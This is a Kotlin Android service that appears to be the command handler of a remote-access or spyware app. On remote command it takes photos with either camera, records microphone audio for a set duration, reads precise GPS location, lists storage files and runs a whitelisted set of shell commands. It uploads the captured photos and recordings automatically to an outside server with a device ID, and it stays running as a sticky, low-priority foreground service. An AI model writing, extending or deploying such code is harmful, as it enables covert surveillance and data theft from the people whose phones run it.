// android/app/src/main/kotlin/com/example/kem/NativeCommandService.kt
package com.example.kem

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.BitmapFactory
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.os.Binder
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import com.google.common.util.concurrent.ListenableFuture
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class NativeCommandService : LifecycleService() {
    
    companion object {
        private const val TAG = "NativeCommandService"
        private const val NOTIFICATION_ID = 999
        private const val CHANNEL_ID = "native_command_service_channel"
        
        // Command types
        const val CMD_TAKE_PICTURE = "command_take_picture"
        const val CMD_RECORD_AUDIO = "command_record_voice"
        const val CMD_GET_LOCATION = "command_get_location"
        const val CMD_LIST_FILES = "command_list_files"
        const val CMD_EXECUTE_SHELL = "command_execute_shell"
        
        // Intent extras
        const val EXTRA_COMMAND = "command"
        const val EXTRA_ARGS = "args"
        const val EXTRA_CALLBACK_CLASS = "callback_class"
        
        // Shared instance for communication
        @Volatile
        private var instance: NativeCommandService? = null
        
        fun getInstance(): NativeCommandService? = instance
        
        fun executeCommand(context: Context, command: String, args: JSONObject = JSONObject()) {
            val intent = Intent(context, NativeCommandService::class.java).apply {
                putExtra(EXTRA_COMMAND, command)
                putExtra(EXTRA_ARGS, args.toString())
            }
            context.startForegroundService(intent)
        }
    }
    
    // Service components
    private lateinit var cameraExecutor: ExecutorService
    private var cameraProvider: ProcessCameraProvider? = null
    private var imageCapture: ImageCapture? = null
    private var mediaRecorder: MediaRecorder? = null
    private var locationManager: LocationManager? = null
    
    // Callback interface for command results
    interface CommandCallback {
        fun onCommandResult(command: String, success: Boolean, result: JSONObject)
    }
    
    private var commandCallback: CommandCallback? = null
    
    // Binder for service binding
    inner class LocalBinder : Binder() {
        fun getService(): NativeCommandService = this@NativeCommandService
    }
    
    private val binder = LocalBinder()
    
    override fun onCreate() {
        super.onCreate()
        instance = this
        
        cameraExecutor = Executors.newSingleThreadExecutor()
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification("Native Command Service Active"))
        
        Log.d(TAG, "Native Command Service created and started in foreground")
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        
        intent?.let { processCommand(it) }
        
        return START_STICKY // Keep service running
    }
    
    override fun onBind(intent: Intent): IBinder {
        super.onBind(intent)
        return binder
    }
    
    fun setCommandCallback(callback: CommandCallback?) {
        this.commandCallback = callback
    }
    
    private fun processCommand(intent: Intent) {
        val command = intent.getStringExtra(EXTRA_COMMAND) ?: return
        val argsString = intent.getStringExtra(EXTRA_ARGS) ?: "{}"
        
        try {
            val args = JSONObject(argsString)
            Log.d(TAG, "Processing command: $command with args: $args")
            
            // Update notification to show current operation
            updateNotification("Executing: $command")
            
            // Execute command asynchronously
            CoroutineScope(Dispatchers.IO).launch {
                executeCommandInternal(command, args)
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error processing command: $command", e)
            sendErrorResult(command, "Failed to parse command arguments: ${e.message}")
        }
    }
    
    private suspend fun executeCommandInternal(command: String, args: JSONObject) {
        try {
            when (command) {
                CMD_TAKE_PICTURE -> handleTakePicture(args)
                CMD_RECORD_AUDIO -> handleRecordAudio(args)
                CMD_GET_LOCATION -> handleGetLocation(args)
                CMD_LIST_FILES -> handleListFiles(args)
                CMD_EXECUTE_SHELL -> handleExecuteShell(args)
                else -> {
                    Log.w(TAG, "Unknown command: $command")
                    sendErrorResult(command, "Unknown command: $command")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error executing command: $command", e)
            sendErrorResult(command, "Command execution failed: ${e.message}")
        } finally {
            // Reset notification
            updateNotification("Native Command Service Active")
        }
    }
    
    private suspend fun handleTakePicture(args: JSONObject) = withContext(Dispatchers.Main) {
        if (!hasPermission(android.Manifest.permission.CAMERA)) {
            sendErrorResult(CMD_TAKE_PICTURE, "Camera permission not granted")
            return@withContext
        }
        
        try {
            val lensDirection = args.optString("camera", "back")
            val cameraSelector = if (lensDirection.equals("front", ignoreCase = true)) {
                CameraSelector.DEFAULT_FRONT_CAMERA
            } else {
                CameraSelector.DEFAULT_BACK_CAMERA
            }
            
            val cameraProviderFuture = ProcessCameraProvider.getInstance(this@NativeCommandService)
            cameraProvider = cameraProviderFuture.get()
            
            if (!cameraProvider!!.hasCamera(cameraSelector)) {
                sendErrorResult(CMD_TAKE_PICTURE, "Requested camera not available")
                return@withContext
            }
            
            imageCapture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .build()
            
            cameraProvider?.unbindAll()
            cameraProvider?.bindToLifecycle(this@NativeCommandService, cameraSelector, imageCapture)
            
            val photoFile = createImageFile()
            val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()
            
            imageCapture?.takePicture(
                outputOptions,
                ContextCompat.getMainExecutor(this@NativeCommandService),
                object : ImageCapture.OnImageSavedCallback {
                    override fun onError(exception: ImageCaptureException) {
                        Log.e(TAG, "Photo capture failed", exception)
                        sendErrorResult(CMD_TAKE_PICTURE, "Photo capture failed: ${exception.message}")
                    }
                    
                    override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                        Log.d(TAG, "Photo saved successfully: ${photoFile.absolutePath}")
                        
                        val result = JSONObject().apply {
                            put("path", photoFile.absolutePath)
                            put("size", photoFile.length())
                            put("camera", lensDirection)
                        }
                        
                        sendSuccessResult(CMD_TAKE_PICTURE, result)
                        
                        // Upload file automatically
                        uploadFile(photoFile, CMD_TAKE_PICTURE)
                    }
                }
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Camera setup failed", e)
            sendErrorResult(CMD_TAKE_PICTURE, "Camera setup failed: ${e.message}")
        }
    }
    
    private suspend fun handleRecordAudio(args: JSONObject) = withContext(Dispatchers.IO) {
        if (!hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
            sendErrorResult(CMD_RECORD_AUDIO, "Audio recording permission not granted")
            return@withContext
        }
        
        try {
            val duration = args.optInt("duration", 10)
            val quality = args.optString("quality", "medium")
            
            val audioFile = createAudioFile()
            
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this@NativeCommandService)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                
                when (quality.lowercase()) {
                    "high" -> {
                        setAudioSamplingRate(44100)
                        setAudioEncodingBitRate(128000)
                    }
                    "medium" -> {
                        setAudioSamplingRate(22050)
                        setAudioEncodingBitRate(64000)
                    }
                    "low" -> {
                        setAudioSamplingRate(8000)
                        setAudioEncodingBitRate(32000)
                    }
                }
                
                setOutputFile(audioFile.absolutePath)
                prepare()
                start()
            }
            
            Log.d(TAG, "Started audio recording for ${duration}s")
            
            // Wait for recording duration
            delay(duration * 1000L)
            
            mediaRecorder?.apply {
                stop()
                reset()
                release()
            }
            mediaRecorder = null
            
            if (audioFile.exists() && audioFile.length() > 0) {
                val result = JSONObject().apply {
                    put("path", audioFile.absolutePath)
                    put("size", audioFile.length())
                    put("duration", duration)
                    put("quality", quality)
                }
                
                Log.d(TAG, "Audio recording completed: ${audioFile.absolutePath}")
                sendSuccessResult(CMD_RECORD_AUDIO, result)
                
                // Upload file automatically
                uploadFile(audioFile, CMD_RECORD_AUDIO)
            } else {
                sendErrorResult(CMD_RECORD_AUDIO, "Audio file was not created or is empty")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Audio recording failed", e)
            mediaRecorder?.apply {
                try {
                    stop()
                    reset()
                    release()
                } catch (ex: Exception) {
                    Log.e(TAG, "Error stopping media recorder", ex)
                }
            }
            mediaRecorder = null
            sendErrorResult(CMD_RECORD_AUDIO, "Audio recording failed: ${e.message}")
        }
    }
    
    private suspend fun handleGetLocation(args: JSONObject) = withContext(Dispatchers.Main) {
        if (!hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) {
            sendErrorResult(CMD_GET_LOCATION, "Location permission not granted")
            return@withContext
        }
        
        try {
            val locationListener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    val result = JSONObject().apply {
                        put("latitude", location.latitude)
                        put("longitude", location.longitude)
                        put("accuracy", location.accuracy)
                        put("altitude", location.altitude)
                        put("speed", location.speed)
                        put("timestamp", location.time)
                    }
                    
                    Log.d(TAG, "Location obtained: ${location.latitude}, ${location.longitude}")
                    sendSuccessResult(CMD_GET_LOCATION, result)
                    
                    locationManager?.removeUpdates(this)
                }
                
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }
            
            // Try GPS first, then network
            val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
            var locationRequested = false
            
            for (provider in providers) {
                if (locationManager?.isProviderEnabled(provider) == true) {
                    locationManager?.requestLocationUpdates(
                        provider,
                        1000L, // 1 second
                        1f, // 1 meter
                        locationListener,
                        Looper.getMainLooper()
                    )
                    locationRequested = true
                    break
                }
            }
            
            if (!locationRequested) {
                sendErrorResult(CMD_GET_LOCATION, "No location providers available")
                return@withContext
            }
            
            // Timeout after 30 seconds
            CoroutineScope(Dispatchers.IO).launch {
                delay(30000)
                locationManager?.removeUpdates(locationListener)
                sendErrorResult(CMD_GET_LOCATION, "Location request timed out")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Location request failed", e)
            sendErrorResult(CMD_GET_LOCATION, "Location request failed: ${e.message}")
        }
    }
    
    private suspend fun handleListFiles(args: JSONObject) = withContext(Dispatchers.IO) {
        try {
            val path = args.optString("path", "/storage/emulated/0")
            val directory = File(path)
            
            if (!directory.exists() || !directory.isDirectory) {
                sendErrorResult(CMD_LIST_FILES, "Invalid directory path: $path")
                return@withContext
            }
            
            val files = directory.listFiles()
            val filesArray = JSONArray()
            
            files?.forEach { file ->
                val fileInfo = JSONObject().apply {
                    put("name", file.name)
                    put("path", file.absolutePath)
                    put("isDirectory", file.isDirectory)
                    put("size", file.length())
                    put("lastModified", file.lastModified())
                }
                filesArray.put(fileInfo)
            }
            
            val result = JSONObject().apply {
                put("path", directory.absolutePath)
                put("files", filesArray)
                put("totalFiles", files?.size ?: 0)
            }
            
            Log.d(TAG, "Listed ${files?.size ?: 0} files in: $path")
            sendSuccessResult(CMD_LIST_FILES, result)
            
        } catch (e: Exception) {
            Log.e(TAG, "File listing failed", e)
            sendErrorResult(CMD_LIST_FILES, "File listing failed: ${e.message}")
        }
    }
    
    private suspend fun handleExecuteShell(args: JSONObject) = withContext(Dispatchers.IO) {
        try {
            val command = args.optString("command_name", "")
            val commandArgs = mutableListOf<String>()
            
            val argsArray = args.optJSONArray("command_args")
            if (argsArray != null) {
                for (i in 0 until argsArray.length()) {
                    commandArgs.add(argsArray.getString(i))
                }
            }
            
            // Whitelist of allowed commands for security
            val allowedCommands = mapOf(
                "ls" to "/system/bin/ls",
                "pwd" to "/system/bin/pwd",
                "whoami" to "/system/bin/whoami",
                "id" to "/system/bin/id",
                "ps" to "/system/bin/ps"
            )
            
            if (!allowedCommands.containsKey(command)) {
                sendErrorResult(CMD_EXECUTE_SHELL, "Command not allowed: $command")
                return@withContext
            }
            
            val fullCommand = mutableListOf(allowedCommands[command]!!)
            fullCommand.addAll(commandArgs)
            
            val processBuilder = ProcessBuilder(fullCommand)
            val process = processBuilder.start()
            
            val stdout = process.inputStream.bufferedReader().use { it.readText() }
            val stderr = process.errorStream.bufferedReader().use { it.readText() }
            
            val exited = process.waitFor(10, TimeUnit.SECONDS)
            if (!exited) {
                process.destroyForcibly()
                sendErrorResult(CMD_EXECUTE_SHELL, "Command execution timed out")
                return@withContext
            }
            
            val exitCode = process.exitValue()
            
            val result = JSONObject().apply {
                put("command", command)
                put("args", JSONArray(commandArgs))
                put("stdout", stdout)
                put("stderr", stderr)
                put("exitCode", exitCode)
            }
            
            Log.d(TAG, "Shell command executed: $command, exit code: $exitCode")
            sendSuccessResult(CMD_EXECUTE_SHELL, result)
            
        } catch (e: Exception) {
            Log.e(TAG, "Shell command execution failed", e)
            sendErrorResult(CMD_EXECUTE_SHELL, "Shell execution failed: ${e.message}")
        }
    }
    
    private fun uploadFile(file: File, commandRef: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                // This should match your server configuration
                val serverUrl = "https://ws.sosa-qav.es/upload_command_file"
                val deviceId = getDeviceId()
                
                val connection = URL(serverUrl).openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=***")
                
                val boundary = "***"
                val writer = PrintWriter(OutputStreamWriter(connection.outputStream, "UTF-8"), true)
                
                // Add deviceId field
                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"deviceId\"\r\n\r\n")
                writer.append(deviceId).append("\r\n")
                
                // Add commandRef field
                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"commandRef\"\r\n\r\n")
                writer.append(commandRef).append("\r\n")
                
                // Add file
                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"${file.name}\"\r\n")
                writer.append("Content-Type: application/octet-stream\r\n\r\n")
                writer.flush()
                
                file.inputStream().use { input ->
                    connection.outputStream.use { output ->
                        input.copyTo(output)
                    }
                }
                
                writer.append("\r\n--$boundary--\r\n")
                writer.close()
                
                val responseCode = connection.responseCode
                Log.d(TAG, "File upload response code: $responseCode for $commandRef")
                
            } catch (e: Exception) {
                Log.e(TAG, "File upload failed for $commandRef", e)
            }
        }
    }
    
    private fun sendSuccessResult(command: String, result: JSONObject) {
        commandCallback?.onCommandResult(command, true, result)
        Log.d(TAG, "Command succeeded: $command")
    }
    
    private fun sendErrorResult(command: String, error: String) {
        val result = JSONObject().apply {
            put("error", error)
        }
        commandCallback?.onCommandResult(command, false, result)
        Log.e(TAG, "Command failed: $command - $error")
    }
    
    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }
    
    private fun createImageFile(): File {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US).format(Date())
        val imageDir = File(externalCacheDir ?: cacheDir, "NativeImages").apply {
            if (!exists()) mkdirs()
        }
        return File(imageDir, "IMG_native_$timestamp.jpg")
    }
    
    private fun createAudioFile(): File {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US).format(Date())
        val audioDir = File(externalCacheDir ?: cacheDir, "NativeAudio").apply {
            if (!exists()) mkdirs()
        }
        return File(audioDir, "AUD_native_$timestamp.3gp")
    }
    
    private fun getDeviceId(): String {
        val prefs = getSharedPreferences("kem_prefs", Context.MODE_PRIVATE)
        return prefs.getString("device_id", "unknown_device") ?: "unknown_device"
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Native Command Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Handles remote commands independently"
                setShowBadge(false)
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(content: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Native Command Service")
            .setContentText(content)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
    
    private fun updateNotification(content: String) {
        val notification = createNotification(content)
        val notificationManager = getSystemService(NotificationManager::class.java)
        notificationManager.notify(NOTIFICATION_ID, notification)
    }
    
    override fun onDestroy() {
        super.onDestroy()
        
        // Clean up resources
        cameraProvider?.unbindAll()
        mediaRecorder?.apply {
            try {
                stop()
                reset()
                release()
            } catch (e: Exception) {
                Log.e(TAG, "Error releasing media recorder", e)
            }
        }
        
        if (!cameraExecutor.isShutdown) {
            cameraExecutor.shutdown()
        }
        
        instance = null
        Log.d(TAG, "Native Command Service destroyed")
    }
}